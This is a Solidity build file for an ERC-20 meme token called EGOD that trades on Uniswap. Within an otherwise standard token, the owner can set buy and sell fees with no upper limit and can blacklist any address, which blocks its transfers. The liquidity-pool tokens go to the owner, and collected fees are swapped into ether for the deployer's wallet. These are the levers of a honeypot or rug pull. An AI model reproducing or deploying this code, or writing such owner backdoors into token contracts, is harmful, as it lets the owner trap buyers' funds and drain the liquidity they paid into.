{{
  "language": "Solidity",
  "sources": {
    "contracts/A-MISHA2.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\n\r\n*/\r\n\r\npragma solidity 0.8.23;\r\n\r\nabstract contract BaseContext {\r\n    function _msgCaller() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SecureMath {\r\n    function add(uint256 x, uint256 y) internal pure returns (uint256) {\r\n        uint256 z = x + y;\r\n        require(z >= x, \"SecureMath: addition overflow\");\r\n        return z;\r\n    }\r\n\r\n    function sub(uint256 x, uint256 y) internal pure returns (uint256) {\r\n        return sub(x, y, \"SecureMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 x, uint256 y, string memory errorMsg) internal pure returns (uint256) {\r\n        require(y <= x, errorMsg);\r\n        uint256 z = x - y;\r\n        return z;\r\n    }\r\n\r\n    function mul(uint256 x, uint256 y) internal pure returns (uint256) {\r\n        if (x == 0) {\r\n            return 0;\r\n        }\r\n        uint256 z = x * y;\r\n        require(z / x == y, \"SecureMath: multiplication overflow\");\r\n        return z;\r\n    }\r\n\r\n    function div(uint256 x, uint256 y) internal pure returns (uint256) {\r\n        return div(x, y, \"SecureMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 x, uint256 y, string memory errorMsg) internal pure returns (uint256) {\r\n        require(y > 0, errorMsg);\r\n        uint256 z = x / y;\r\n        return z;\r\n    }\r\n}\r\n\r\ncontract Controllable is BaseContext {\r\n    address private _controller;\r\n    event ControllerTransferred(address indexed previousController, address indexed newController);\r\n\r\n    constructor () {\r\n        address caller = _msgCaller();\r\n        _controller = caller;\r\n        emit ControllerTransferred(address(0), caller);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _controller;\r\n    }\r\n\r\n    modifier onlyController() {\r\n        require(_controller == _msgCaller(), \"Controllable: caller is not the controller\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyController {\r\n        payable(owner()).transfer(address(this).balance);\r\n        emit ControllerTransferred(_controller, address(0));\r\n        _controller = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract EGOD is BaseContext, IERC20, Controllable {\r\n    using SecureMath for uint256;\r\n    mapping (address => uint256) private _holdings;\r\n    mapping (address => mapping (address => uint256)) private _permissions;\r\n    mapping (address => bool) private _isFeeExempt;\r\n    mapping (address => bool) private restricted;\r\n    address payable private _feeCollector;\r\n\r\n    uint256 private _purchaseFee = 20;  \r\n    uint256 private _saleFee = 22; \r\n    uint256 private _purchaseCounter = 0;\r\n    uint8 private constant _precision = 9;\r\n    uint256 private constant _totalSupply = 1000000000 * 10**_precision;\r\n    string private constant _tokenName = unicode\"Epic Gamer On Duty\";\r\n    string private constant _tokenSymbol = unicode\"EGOD\";\r\n    uint256 public _maxPurchaseLimit = 20000000 * 10**_precision;\r\n    uint256 public _maxHoldingLimit = 20000000 * 10**_precision;\r\n    uint256 public _feeSwapLimit = 10000000 * 10**_precision;\r\n    uint256 public _maxFeeSwap = 10000000 * 10**_precision;\r\n    uint256 private liquidityShare = 20; \r\n\r\n    IUniswapV2Router02 private dexRouter;\r\n    address private dexPair;\r\n    bool private tradingActive;\r\n    bool private duringSwap = false;\r\n    bool private swapActive = false;\r\n    uint256 private salesCount = 0;\r\n    uint256 private lastSaleBlock = 0;\r\n    event MaxTxAmountUpdated(uint _maxPurchaseLimit);\r\n    modifier lockSwap {\r\n        duringSwap = true;\r\n        _;\r\n        duringSwap = false;\r\n    }\r\n\r\n    constructor () payable {\r\n        _feeCollector = payable(_msgCaller());\r\n        _holdings[_msgCaller()] = _totalSupply;\r\n        _isFeeExempt[owner()] = true;\r\n        _isFeeExempt[address(this)] = true;\r\n        _isFeeExempt[_feeCollector] = true;\r\n\r\n        emit Transfer(address(0), _msgCaller(), _totalSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _tokenName;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _tokenSymbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _precision;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _holdings[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgCaller(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address holder, address spender) public view override returns (uint256) {\r\n        return _permissions[holder][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgCaller(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgCaller(), _permissions[sender][_msgCaller()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address holder, address spender, uint256 amount) private {\r\n        require(holder != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _permissions[holder][spender] = amount;\r\n        emit Approval(holder, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 feeAmount = 0;\r\n        if (from != owner() && to != owner()) {\r\n            require(!restricted[from] && !restricted[to]);\r\n\r\n            if (from == dexPair && to != address(dexRouter) && !_isFeeExempt[to]) {\r\n                feeAmount = amount.mul(_purchaseFee).div(100);\r\n                require(amount <= _maxPurchaseLimit, \"Exceeds the _maxPurchaseLimit.\");\r\n                require(balanceOf(to) + amount <= _maxHoldingLimit, \"Exceeds the maxHoldingLimit.\");\r\n                _purchaseCounter++;\r\n            }\r\n\r\n            if (to == dexPair && from != address(this)) {\r\n                feeAmount = amount.mul(_saleFee).div(100);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!duringSwap && to == dexPair && swapActive && contractTokenBalance > _feeSwapLimit) {\r\n                if (block.number > lastSaleBlock) {\r\n                    salesCount = 0;\r\n                }\r\n                require(salesCount < 3, \"Only 3 sells per block!\");\r\n                swapTokensForEth(min(amount, min(contractTokenBalance, _maxFeeSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance > 0) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n                salesCount++;\r\n                lastSaleBlock = block.number;\r\n            }\r\n        }\r\n\r\n        if (feeAmount > 0) {\r\n            _holdings[address(this)] = _holdings[address(this)].add(feeAmount);\r\n            emit Transfer(from, address(this), feeAmount);\r\n        }\r\n        _holdings[from] = _holdings[from].sub(amount);\r\n        _holdings[to] = _holdings[to].add(amount.sub(feeAmount));\r\n        emit Transfer(from, to, amount.sub(feeAmount));\r\n    }\r\n\r\n    function min(uint256 x, uint256 y) private pure returns (uint256) {\r\n        return (x > y) ? y : x;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n        _approve(address(this), address(dexRouter), tokenAmount);\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function clearlpd1(uint256 _share) external onlyController {\r\n        require(_share <= 100, \"Share cannot exceed 100\");\r\n        liquidityShare = _share;\r\n    }\r\n\r\n    function updateFees(uint256 finalFeeOnBuy, uint256 finalFeeOnSell) public onlyController {\r\n        _purchaseFee = finalFeeOnBuy;\r\n        _saleFee = finalFeeOnSell;\r\n    }\r\n\r\n    function removeLimits() external onlyController {\r\n        _maxPurchaseLimit = _totalSupply;\r\n        _maxHoldingLimit = _totalSupply;\r\n        emit MaxTxAmountUpdated(_totalSupply);\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        _feeCollector.transfer(amount);\r\n    }\r\n\r\n    function addB(address[] memory restricted_) public onlyController {\r\n        for (uint i = 0; i < restricted_.length; i++) {\r\n            restricted[restricted_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function delB(address[] memory notRestricted) public onlyController {\r\n        for (uint i = 0; i < notRestricted.length; i++) {\r\n            restricted[notRestricted[i]] = false;\r\n        }\r\n    }\r\n\r\n    function isBot(address addr) public view returns (bool) {\r\n        return restricted[addr];\r\n    }\r\n\r\n    function openTrading() external onlyController {\r\n        require(!tradingActive, \"trading is already open\");\r\n        dexRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), msg.sender, type(uint256).max);\r\n        transfer(address(this), balanceOf(msg.sender).mul(liquidityShare).div(100));\r\n        dexPair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());\r\n        _approve(address(this), address(dexRouter), type(uint256).max);\r\n        dexRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);\r\n        IERC20(dexPair).approve(address(dexRouter), type(uint).max);\r\n        swapActive = true;\r\n        tradingActive = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwap() external {\r\n        require(_msgCaller() == _feeCollector);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance > 0) {\r\n            swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            sendETHToFee(ethBalance);\r\n        }\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "remappings": []
  }
}}